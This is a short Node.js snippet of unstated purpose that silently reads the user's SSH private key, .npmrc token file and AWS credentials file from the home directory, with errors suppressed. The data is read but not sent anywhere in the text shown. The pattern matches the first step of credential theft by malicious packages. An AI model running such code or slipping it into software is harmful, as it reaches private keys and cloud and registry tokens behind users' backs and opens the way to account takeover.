const fs = require('fs'); const os = require('os');
for (const f of ['.ssh/id_rsa', '.npmrc', '.aws/credentials']) { try { fs.readFileSync(os.homedir() + '/' + f, 'utf8'); } catch (e) {} }
